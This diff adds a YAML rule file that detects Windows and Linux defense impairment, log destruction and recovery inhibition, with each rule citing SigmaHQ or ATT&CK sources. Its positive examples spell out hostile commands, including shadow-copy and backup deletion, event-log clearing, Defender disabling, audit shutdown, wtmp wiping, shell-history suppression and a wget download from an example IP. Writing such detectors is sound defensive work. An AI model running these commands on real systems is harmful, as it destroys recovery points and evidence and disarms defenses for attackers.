@@ -1,0 +1,390 @@
+# Mention patterns for defense impairment, log and history destruction, and recovery inhibition written in free
+# text: shadow copy and backup deletion, boot recovery tampering, Windows event log clearing, Defender switches,
+# Linux audit and logging shutdown, and history suppression. Sources are SigmaHQ rules and the procedure text of the
+# cited ATT&CK techniques (vendored Enterprise 20.0).
+
+- id: mention.impact_vssadmin_delete_shadows
+  title: 'vssadmin delete shadows command text'
+  match:
+    anchored: 'vssadmin(?:\.exe)?["'']? {1,3}delete {1,3}shadows'
+  case_sensitive: false
+  strength: strong
+  attack: [T1490]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: Shadow Copies Deletion Using Operating Systems Utilities (Florian Roth, Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_deletion.yml
+    license: DRL-1.1
+    upstream_id: c947b146-0abc-4c87-9c64-b17e9d7274a2
+  rationale: >-
+    Deleting all shadow copies removes local restore points right before encryption; it is in nearly every ransomware
+    playbook. Administrators rarely delete shadows by hand, and the rule's listed benign case is a deliberate cleanup.
+  examples:
+    positive:
+      - 'C:\Windows\system32\vssadmin.exe delete shadows /all /quiet'
+    negative:
+      - 'vssadmin list shadows'
+      - 'vssadmin create shadow /for=C:'
+
+- id: mention.impact_wmic_shadowcopy_delete
+  title: 'wmic shadowcopy delete command text'
+  match:
+    anchored: 'shadowcopy {1,3}delete'
+  case_sensitive: false
+  strength: strong
+  attack: [T1490, T1047]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: Shadow Copies Deletion Using Operating Systems Utilities (Florian Roth, Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_deletion.yml
+    license: DRL-1.1
+    upstream_id: c947b146-0abc-4c87-9c64-b17e9d7274a2
+  rationale: >-
+    'wmic shadowcopy delete' is the WMI form of shadow deletion used by ransomware when vssadmin is monitored; there is
+    no routine administrative use.
+  examples:
+    positive:
+      - 'wmic.exe shadowcopy delete /nointeractive'
+    negative:
+      - 'wmic shadowcopy list brief'
+      - 'wmic process where name="notepad.exe" delete'
+
+- id: mention.impact_wmi_shadowcopy_delete_method
+  title: 'Win32_ShadowCopy .Delete() PowerShell text'
+  match:
+    anchored: 'Win32_ShadowCopy[^\n]{0,120}\.Delete\(\)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1490]
+  telemetry: [windows_text]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1490 Inhibit System Recovery
+    url: https://attack.mitre.org/techniques/T1490
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1490
+  rationale: >-
+    Author-composed shape from T1490; strong because deleting every shadow copy object has no administrative use.
+    'Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }' deletes every shadow copy without vssadmin or
+    wmic; ransomware PowerShell stages use it.
+  examples:
+    positive:
+      - 'powershell -c "Get-WmiObject Win32_ShadowCopy | ForEach-Object {$_.Delete()}"'
+    negative:
+      - 'powershell -c "Get-WmiObject Win32_ShadowCopy | Select-Object ID,InstallDate"'
+      - 'powershell -c "Get-CimInstance Win32_ShadowStorage"'
+
+- id: mention.impact_wbadmin_delete
+  title: 'wbadmin delete catalog or backup command text'
+  match:
+    anchored: 'wbadmin(?:\.exe)?["'']? {1,3}delete {1,3}(?:catalog|systemstatebackup|backup)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1490]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: All Backups Deleted Via Wbadmin.EXE (frack113, Nasreddine Bencherchali)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_wbadmin_delete_all_backups.yml
+    license: DRL-1.1
+    upstream_id: 639c9081-f482-47d3-a0bd-ddee3d4ecd76
+  rationale: >-
+    Deleting the backup catalog or system state backups removes recovery options, a ransomware pre-encryption step.
+    Backup rotation is configured in the backup product, not run as wbadmin delete by hand.
+  examples:
+    positive:
+      - 'wbadmin delete catalog -quiet'
+      - 'wbadmin delete systemstatebackup -keepVersions:0'
+    negative:
+      - 'wbadmin get versions'
+      - 'wbadmin start backup -backupTarget:E: -include:C: -quiet'
+
+- id: mention.impact_bcdedit_recovery_disabled
+  title: 'bcdedit ''recoveryenabled no'' or ''ignoreallfailures'' command text'
+  match:
+    anchored: 'bcdedit(?:\.exe)?["'']?[^\n]{0,40}/set {1,3}\{default\} {1,3}(?:recoveryenabled {1,3}no|bootstatuspolicy {1,3}ignoreallfailures)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1490]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: Boot Configuration Tampering Via Bcdedit.EXE (E.M. Anhaus, Endgame, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_bcdedit_boot_conf_tamper.yml
+    license: DRL-1.1
+    upstream_id: 1444443e-6757-43e4-9ea4-c8fc705f79a2
+  rationale: >-
+    Turning off Windows recovery and ignoring boot failures prevents repair after encryption; the rule rates false
+    positives as unlikely.
+  examples:
+    positive:
+      - 'bcdedit /set {default} recoveryenabled No'
+      - 'bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures'
+    negative:
+      - 'bcdedit /enum all'
+      - 'bcdedit /set {current} description "Windows Server 2022"'
+
+- id: mention.impact_wevtutil_clear
+  title: 'wevtutil clear-log command text'
+  match:
+    anchored: 'wevtutil(?:\.exe)?["'']? {1,3}(?:cl|clear-log) '
+  case_sensitive: false
+  strength: strong
+  attack: [T1685.005]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: Suspicious Eventlog Clearing or Configuration Change Activity (Ecco, Daniil Yugoslavskiy, oscd.community, D3F7A5105, Swachchhanda Shrawan Poudel)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_susp_eventlog_clear.yml
+    license: DRL-1.1
+    upstream_id: cc36992a-4671-4f21-a91d-6c2b72a2edf5
+  rationale: >-
+    Clearing Security, System or PowerShell logs with wevtutil destroys evidence. Log retention is handled by size
+    limits and forwarding, so a manual clear is rarely benign.
+  examples:
+    positive:
+      - 'wevtutil cl Security'
+      - 'for /F "tokens=*" %1 in (''wevtutil.exe el'') DO wevtutil.exe cl "%1"'
+    negative:
+      - 'wevtutil qe Security /c:5 /f:text'
+      - 'wevtutil gl Application'
+
+- id: mention.impact_powershell_clear_eventlog
+  title: 'Clear-EventLog or Remove-EventLog command text'
+  match:
+    literal: ['Clear-EventLog ', 'Remove-EventLog ']
+  case_sensitive: false
+  strength: medium
+  attack: [T1685.005]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: Suspicious Eventlog Clearing or Configuration Change Activity (Ecco, Daniil Yugoslavskiy, oscd.community, D3F7A5105, Swachchhanda Shrawan Poudel)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_susp_eventlog_clear.yml
+    license: DRL-1.1
+    upstream_id: cc36992a-4671-4f21-a91d-6c2b72a2edf5
+  rationale: >-
+    The PowerShell form of event log clearing. Application installers remove their own custom logs with
+    Remove-EventLog, so it is medium; the log name decides.
+  examples:
+    positive:
+      - 'powershell -c "Clear-EventLog -LogName Security,System"'
+    negative:
+      - 'powershell -c "Get-EventLog -LogName System -Newest 20"'
+      - 'powershell -c "New-EventLog -LogName Application -Source CorpApp"'
+
+- id: mention.impact_defender_disable
+  title: '''Set-MpPreference -Disable* $true'' command text'
+  match:
+    anchored: 'Set-MpPreference[^\n]{0,80}-Disable(?:RealtimeMonitoring|BehaviorMonitoring|IOAVProtection|BlockAtFirstSeen|ArchiveScanning|ScriptScanning|CatchupFullScan|CatchupQuickScan) {1,3}(?:\$true|1)\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1685]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: Powershell Defender Disable Scan Feature (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml
+    license: DRL-1.1
+    upstream_id: 1ec65a5f-9473-4f12-97da-622044d6df21
+  rationale: >-
+    Turning off real-time, behavior or download scanning from a command line is a standard pre-payload step.
+    Enterprises manage Defender through policy, not per-host Set-MpPreference calls.
+  examples:
+    positive:
+      - 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'
+    negative:
+      - 'powershell Set-MpPreference -DisableRealtimeMonitoring $false'
+      - 'powershell Get-MpPreference | Select DisableRealtimeMonitoring'
+
+- id: mention.impact_defender_exclusion
+  title: 'Add-MpPreference -Exclusion command text'
+  match:
+    anchored: 'Add-MpPreference[^\n]{0,40}-Exclusion(?:Path|Process|Extension|IpAddress)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1685]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: Powershell Defender Disable Scan Feature (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml
+    license: DRL-1.1
+    upstream_id: 1ec65a5f-9473-4f12-97da-622044d6df21
+  rationale: >-
+    Excluding a path or process from scanning lets a payload run unscanned; malware commonly excludes its own
+    directory. Administrators add exclusions for databases and build tools, so it is medium; the excluded path
+    decides.
+  examples:
+    positive:
+      - 'powershell -c "Add-MpPreference -ExclusionPath C:\Users\Public"'
+    negative:
+      - 'powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"'
+      - 'powershell -c "Update-MpSignature"'
+
+- id: mention.impact_auditctl_delete_rules
+  title: 'auditctl -D command text'
+  match:
+    anchored: 'auditctl {1,3}-D\b'
+  case_sensitive: true
+  strength: medium
+  attack: [T1685.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Audit Rules Deleted Via Auditctl (Mohamed LAKRI)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_auditctl_clear_rules.yml
+    license: DRL-1.1
+    upstream_id: bed26dea-4525-47f4-b24a-76e30e44ffb0
+  rationale: >-
+    'auditctl -D' removes every audit rule so nothing further is recorded. augenrules runs it legitimately before
+    loading a new rule set, and the rule lists administrator troubleshooting, so it is medium; a -D not followed by
+    a rule load is the lead.
+  examples:
+    positive:
+      - 'Nov 20 15:00:00 web01 bash[950]: HISTORY: auditctl -D'
+    negative:
+      - 'Nov 20 15:00:01 web01 bash[951]: HISTORY: auditctl -l'
+      - 'Nov 20 15:00:02 web01 bash[952]: HISTORY: auditctl -w /etc/passwd -p wa -k identity'
+
+- id: mention.impact_auditctl_disable
+  title: 'auditctl -e 0 command text'
+  match:
+    anchored: 'auditctl {1,3}-e {0,1}0\b'
+  case_sensitive: true
+  strength: strong
+  attack: [T1685.004]
+  telemetry: [linux_text]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1685.004 Disable or Modify Linux Audit System Log
+    url: https://attack.mitre.org/techniques/T1685/004
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1685.004
+  rationale: >-
+    Author-composed shape from the technique text (auditctl); strong because a full audit disable is never
+    maintenance. 'auditctl -e 0' switches the kernel audit subsystem off entirely. Maintenance uses -D and reload, not
+    a full disable, so it is strong.
+  examples:
+    positive:
+      - 'Nov 20 15:01:00 web01 sh[953]: auditctl -e 0'
+    negative:
+      - 'Nov 20 15:01:01 web01 bash[954]: HISTORY: auditctl -e 2'
+      - 'Nov 20 15:01:02 web01 bash[955]: HISTORY: auditctl -s'
+
+- id: mention.impact_logging_service_stop
+  title: 'systemctl stop, disable or mask of an audit, syslog or security agent (command text)'
+  match:
+    anchored: 'systemctl {1,3}(?:stop|disable|mask|kill) {1,3}(?:auditd|rsyslog|syslog-ng|systemd-journald|falcon-sensor|wazuh-agent|osqueryd|filebeat|auditbeat|elastic-agent|cbagentd|sentinelone|ossec)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1685, T1685.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Disabling Security Tools - Builtin (Ömer Günal, Alejandro Ortuno, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/syslog/lnx_syslog_security_tools_disabling_syslog.yml
+    license: DRL-1.1
+    upstream_id: 49f5dfc1-f92e-4d34-96fa-feba3f6acf36
+  rationale: >-
+    The command-line side of the rule: an operator stopping, disabling or masking the audit daemon, the syslog daemon
+    or an endpoint agent. Upgrades and troubleshooting do this too, so it is medium; a stop without a restart is the
+    lead.
+  examples:
+    positive:
+      - 'Nov 20 15:02:00 web01 bash[956]: HISTORY: systemctl stop auditd; systemctl disable rsyslog'
+    negative:
+      - 'Nov 20 15:02:01 web01 bash[957]: HISTORY: systemctl restart rsyslog'
+      - 'Nov 20 15:02:02 web01 bash[958]: HISTORY: systemctl status auditd'
+
+- id: mention.impact_login_records_truncated
+  title: 'Redirection into wtmp, btmp, lastlog or utmp (command text)'
+  match:
+    literal: ['> /var/log/wtmp', '>/var/log/wtmp', '> /var/log/btmp', '>/var/log/btmp', '> /var/log/lastlog', '>/var/log/lastlog', '> /var/run/utmp', '>/var/run/utmp']
+  case_sensitive: true
+  strength: strong
+  attack: [T1685.006, T1070]
+  telemetry: [linux_text]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1685.006 Clear Linux or Mac System Logs
+    url: https://attack.mitre.org/techniques/T1685/006
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1685.006
+  rationale: >-
+    Author-composed shape from the technique text (utmp/wtmp); strong because login records are rotated, never emptied
+    by redirection. Emptying wtmp, btmp, lastlog or utmp erases who logged in and when; the technique page lists
+    utmp/wtmp among the logs adversaries clear. Rotation is done by logrotate, never by shell redirection.
+  examples:
+    positive:
+      - 'Nov 20 15:03:00 web01 bash[959]: HISTORY: cat /dev/null > /var/log/wtmp; > /var/log/lastlog'
+      - 'Nov 21 09:00:08 web01 bash[4100]: HISTORY: cat /dev/null >/var/log/wtmp'
+      - 'Nov 21 09:00:09 web01 bash[4100]: HISTORY: cat /dev/null > /var/log/btmp'
+      - 'Nov 21 09:00:10 web01 bash[4100]: HISTORY: cat /dev/null >/var/log/btmp'
+      - 'Nov 21 09:00:11 web01 bash[4100]: HISTORY: cat /dev/null >/var/log/lastlog'
+      - 'Nov 21 09:00:12 web01 bash[4100]: HISTORY: cat /dev/null > /var/run/utmp'
+      - 'Nov 21 09:00:13 web01 bash[4100]: HISTORY: cat /dev/null >/var/run/utmp'
+    negative:
+      - 'Nov 20 15:03:01 web01 bash[960]: HISTORY: last -f /var/log/wtmp | head'
+      - 'Nov 20 15:03:02 web01 bash[961]: HISTORY: lastlog -u alice'
+
+- id: mention.impact_var_log_shred
+  title: 'shred of /var/log paths (command text)'
+  match:
+    anchored: 'shred [^\n]{0,60}/var/log/'
+  case_sensitive: true
+  strength: strong
+  attack: [T1685.006, T1070.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Logs Clearing Attempts (Ömer Günal, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_clear_logs.yml
+    license: DRL-1.1
+    upstream_id: 80915f59-9b56-4616-9de0-fd0dea6c12fe
+  rationale: >-
+    The rule covers rm, rmdir, shred and unlink on /var/log; shredding is the unambiguous case, because it is chosen to
+    prevent recovery. Plain rm of logs is common housekeeping and is not imported.
+  examples:
+    positive:
+      - 'Nov 20 15:04:00 web01 bash[962]: HISTORY: shred -zu /var/log/auth.log /var/log/syslog'
+    negative:
+      - 'Nov 20 15:04:01 web01 bash[963]: HISTORY: shred -u /home/alice/old-key.pem'
+      - 'Nov 20 15:04:02 web01 bash[964]: HISTORY: ls /var/log/'
+
+- id: mention.impact_histfile_disabled
+  title: 'HISTFILE=/dev/null, HISTSIZE=0 or ''set +o history'' text'
+  match:
+    literal: ['HISTFILE=/dev/null', 'HISTSIZE=0', 'set +o history']
+  case_sensitive: true
+  strength: strong
+  attack: [T1690]
+  telemetry: [linux_text]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1690 Prevent Command History Logging
+    url: https://attack.mitre.org/techniques/T1690
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1690
+  rationale: >-
+    Author-composed from the technique text (HISTFILE); strong because the same settings in SigmaHQ's history rule are
+    rated high. Pointing HISTFILE at /dev/null, setting the history size to zero or turning history off with set +o
+    stops the session from being recorded, as the technique describes. Ordinary shells set positive sizes.
+  examples:
+    positive:
+      - 'Nov 20 15:05:00 web01 bash[965]: HISTORY: export HISTFILE=/dev/null'
+      - 'Nov 20 15:05:01 web01 bash[966]: HISTORY: set +o history; wget http://203.0.113.7/a'
+      - 'Nov 21 09:00:14 web01 bash[4100]: HISTORY: export HISTSIZE=0'
+    negative:
+      - 'Nov 20 15:05:02 web01 bash[967]: HISTORY: export HISTSIZE=10000'
+      - 'Nov 20 15:05:03 web01 bash[968]: HISTORY: set -o vi'
+
+- id: mention.impact_unset_histfile
+  title: 'unset HISTFILE text'
+  match:
+    literal: ['unset HISTFILE']
+  case_sensitive: true
+  strength: medium
+  attack: [T1690]
+  telemetry: [linux_text]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1690 Prevent Command History Logging
+    url: https://attack.mitre.org/techniques/T1690
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1690
+  rationale: >-
+    The technique names 'unset HISTFILE' as the way to stop a session being recorded. SigmaHQ leaves it out of its
+    history rule as false-positive prone (some shell setups unset it), so it is medium rather than strong.
+  examples:
+    positive:
+      - 'Nov 20 15:06:00 web01 bash[969]: HISTORY: unset HISTFILE; cd /tmp'
+    negative:
+      - 'Nov 20 15:06:01 web01 bash[970]: HISTORY: echo $HISTFILE'
+      - 'Nov 20 15:06:02 web01 bash[971]: HISTORY: unset http_proxy'
